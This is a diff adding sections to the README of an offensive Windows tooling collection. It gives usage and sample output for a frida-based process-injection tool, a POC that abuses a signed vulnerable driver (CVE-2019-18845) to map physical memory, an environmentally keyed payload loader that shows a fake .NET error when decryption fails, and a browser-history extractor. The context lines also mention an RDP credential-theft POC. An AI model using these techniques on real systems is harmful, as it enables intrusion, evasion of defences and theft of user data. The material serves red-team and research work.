@@ -342,6 +342,193 @@ Called ==> SystemProcessInformation
 
 RemoteViewing, is quick POC to demo RDP credential theft through API hooking using [EasyHook](https://easyhook.github.io/) for .Net payloads combined with [Costura](https://github.com/Fody/Costura) to pack resources into a single module. This is adapted from a post by [@0x09AL](https://twitter.com/0x09AL) that you can read [here](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/). To use this you have to compile RemoteViewing and then turn it into shellcode with [Donut](https://github.com/TheWover/donut) after which you have to inject that shellcode into mstsc. RemoteViewing will RC2 encrypt any credentials it captures and write them to disk. You can then use Clairvoyant to decrypt the file in memory, read out the results and delete the file.
 
+### Londor
+
+Londor is a small toolkit which wraps [frida-clr](https://github.com/frida/frida). I initially wanted to create a tool which would allow you to generate DynamoRIO coverage files but I also ported some code from [Fermion](https://github.com/FuzzySecurity/Fermion) to provide some more generic JScript injection capabilities. Note: There are some color palette bugs in Londor that I left unfixed (not my problem & does not affect usability) so if you use it in different terminal flavors you will see some wacky color combos. I may return to this at some point when I have ∆-freeTime.
+
+```
+C:\> Londor.exe
+    __              _
+   |  |   ___ ___ _| |___ ___
+   |  |__| . |   | . | . |  _|
+   |_____|___|_|_|___|___|_|
+
+                         ~b33f
+
+
+  >--~~--> Args? <--~~--<
+
+ --help   (-h)    Show this help message.
+ --type   (-t)    Instrumentation type: Coverage, Script.
+ --out    (-o)    Full output path for DRCOV file.
+ --path   (-p)    Full path to JS script.
+ --pid    (-pid)  PID of the process to attach to.
+ --name   (-n)    Substring name of process to attach to.
+ --start  (-s)    Full path to binary to launch.
+ --args   (-a)    Args to pass to binary.
+
+  >--~~--> Usage? <--~~--<
+
+
+ # Generate coverage information for a process
+ Londor.exe -t Coverage -pid 123 -o C:\Some\Out\Path.drcov
+ Londor.exe -t Coverage -n notepad -o C:\Some\Out\Path.drcov
+ Londor.exe -t Coverage -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -o C:\Some\Out\Path.drcov
+
+ # Inject JS script into process
+ Londor.exe -t Script -pid 123 -p C:\Some\Path\To\Script.js
+ Londor.exe -t Script -n notepad -p C:\Some\Path\To\Script.js
+ Londor.exe -t Script -s C:\Some\Proc\bin.exe -a SomeOrNoArgs -p C:\Some\Path\To\Script.js
+ 
+
+C:\> Londor.exe -t Coverage -s "C:\Windows\System32\notepad.exe" -o C:\Users\b33f\Desktop\test.drcov -a "C:\Users\b33f\Desktop\bla.txt"
+    __              _
+   |  |   ___ ___ _| |___ ___
+   |  |__| . |   | . | . |  _|
+   |_____|___|_|_|___|___|_|
+
+                         ~b33f
+
+
+[>] Spawning process for coverage..
+    |-> PID: 5260; Path: C:\Windows\System32\notepad.exe
+    |-> Script loaded
+
+[*] Press ctrl-c to detach..
+
+[+] Block trace Length: 107160
+    |-> BBS slice: 13395; Total BBS: 13395
+[+] Block trace Length: 18456
+    |-> BBS slice: 2307; Total BBS: 15702
+[+] Block trace Length: 76032
+    |-> BBS slice: 9504; Total BBS: 25206
+[+] Block trace Length: 22216
+    |-> BBS slice: 2777; Total BBS: 27983
+[+] Block trace Length: 20248
+    |-> BBS slice: 2531; Total BBS: 30514
+[+] Block trace Length: 32
+    |-> BBS slice: 4; Total BBS: 30518
+
+[?] Unloading hooks, please wait..
+    |-> Wrote trace data to file
+```
+
+### VirtToPhys
+
+VirtToPhys is a small POC to demonstrate how you can calculate the physical address for a kernel virtual address when exploiting driver bugs that allow you to map physical memory. VirtToPhys uses MsIo.sys, a WHQL signed driver that gives you colorful lights on your RAM (?lolwut), [CVE-2019-18845](https://github.com/active-labs/Advisories/blob/master/2019/ACTIVE-2019-012.md). Hat tips and full credits to [@UlfFrisk](https://twitter.com/UlfFrisk) for his very insightful [MemProcFS](https://github.com/ufrisk/MemProcFS) project and [@hFireF0X](https://twitter.com/hFireF0X) for [KDU](https://github.com/hfiref0x/KDU).
+
+```
+C:\> VirtToPhys.exe -l
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[?] Loading MsIo driver..
+[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
+    |-> Success
+[>] Driver Nt path: \??\C:\Windows\System32\MsIo64.sys
+[>] Driver registration: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MsIoTest
+[?] NtLoadDriver -> Success
+[+] Driver load: OK
+
+C:\> VirtToPhys.exe -v 0xffffd20fc9a5f440
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[*] MsIO driver handle: 604
+[?] Leaking PML4..
+[+] PML4 in lowstub --> 1AB000
+[?] Converting VA -> PA
+    |-> PhysAddress: 7E25F440
+
+C:\> VirtToPhys.exe -u
+ _   _ _      _ _____    ______ _
+| | | (_)    | |_   _|   | ___ \ |
+| | | |_ _ __| |_| | ___ | |_/ / |__  _   _ ___
+| | | | | '__| __| |/ _ \|  __/| '_ \| | | / __|
+\ \_/ / | |  | |_| | (_) | |   | | | | |_| \__ \
+ \___/|_|_|   \__\_/\___/\_|   |_| |_|\__, |___/
+                                       __/ |
+                                      |___/
+
+                                         ~b33f
+[+] Running as Administrator
+[>] Executing on x64
+[?] UnLoading MsIo driver..
+[*] Requesting privilege: SE_LOAD_DRIVER_PRIVILEGE
+    |-> Success
+[+] NtUnloadDriver -> Success
+[+] Driver deleted from disk
+[+] Driver service artifacts deleted
+[?] Driver unload: OK
+```
+
+### DiscerningFinch
+
+DiscerningFinch is ... discerning! FinchGen lets you create an encrypted templated which you can copy/paste into DiscerningFinch. At runtime DiscerningFinch collects [an array of OS specific string constants](https://github.com/FuzzySecurity/Sharp-Suite/blob/master/DiscerningFinch/DiscerningFinch/DiscerningFinch/Helper.cs#L15) and then attempts to use those to brute-force decrypt the inner binary. If it succeeds it loads the inner binary into memory passing along any command line arguments that may exists. If it fails, it prints out a .NET-looking error message as feedback. Take note that the .NET version of the inner binary should be the same as that of DiscerningFinch, compile accordingly.
+
+```
+C:\> FinchGen.exe -p C:\Some\Path\netApp.exe -k "NVIDIA Corporation" -o C:\Some\Path\keyed_template.cs
+
+...
+
+C:\> DiscerningFinch_badKey.exe 111 222 zzz
+System.IndexOutOfRangeException: Finch index was outside the bounds of the array
+    at System.Number.StringToNumber(String str, NumberStyles options, NumberBuffer& number, NumberInfo info)
+    at System.Number.ParseInt32(String s, NumberStyles style, NumberFormatInfo info)
+    at System.Int32.Parse(String s)
+
+C:\> DiscerningFinch_goodKey.exe 111 222 zzz
+[+] Hello There!
+[?] Got 3 cmdline args..
+    |_ 111
+    |_ 222
+    |_ zzz
+```
+
+### Canary
+
+Canary is a small DIY extension to [SharpChrome](https://github.com/GhostPack/SharpDPAPI). It lets you pull browser history for Chrome or the new Chromium Edge. Results are orderd by visit_count and you can pull all data or use the "-l" flag to pull only the last X days. Most of the boilerplate is ripped out of SharpChrome and can be added there easily if someone wants to make a PR for that.
+
+```
+C:\> Canary.exe -h
+ __
+/   _ __  _  __ \/
+\__(_|| |(_| |  /
+
+  -h(--Help)       Show this help message.
+  -l(--Limit)      Limit results to the past x days.
+  -b(--Browser)    Chrome (default) or Edge (new chromium Edge).
+
+C:\> Canary.exe -b edge -l 3
+
+[...Snipped...]
+
+URL             : https://microsoftedgewelcome.microsoft.com/en-us/
+title           : Microsoft Edge
+visit_count     : 2
+last_visit_time : 22/09/2020 12:04:07
+
+[...Snipped...]
+```
+
 ## Windows API
 
 ### GetAPISetMapping
@@ -422,6 +609,37 @@ C:\> SystemProcessAndThreadsInformation.exe -p 4508
     |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:0ms
     |-> WaitTime: 5843460, WaitReason: WrQueue
     |-> State: Wait, ContextSwitches: 30
+
+[...Snipped...]
+```
+
+### GetNetworkInterfaces
+
+GetNetworkInterfaces is a small .Net45 utility to pull local network adapter information. It mostly has feature parity with "ipconfig /all" and can be useful for some fast enumeration.
+
+```
+C:\> GetNetworkInterfaces.exe
+
+[...Snipped...]
+
+VMware Virtual Ethernet Adapter for VMnet8
+  Name .................................... : VMware Network Adapter VMnet8
+  Interface type .......................... : Ethernet
+  Physical Address ........................ : 005056C00008
+  Operational status ...................... : Up
+  IP version .............................. : IPv4 IPv6
+  IPv6 .................................... : fe80::2101:9102:751a:fdd2%16
+  IPv4 .................................... : 192.168.199.1
+  Mask .................................... : 255.255.255.0
+  DHCP .................................... : True
+  DHCP Server ............................. : 192.168.199.254
+  DNS Server .............................. : fec0:0:0:ffff::1%1
+  DNS Server .............................. : fec0:0:0:ffff::2%1
+  DNS Server .............................. : fec0:0:0:ffff::3%1
+  Dynamic DNS ............................. : True
+  DNS suffix .............................. :
+  DNS enabled ............................. : False
+  Primary WINS Server ..................... : 192.168.199.2
 
 [...Snipped...]
 ```
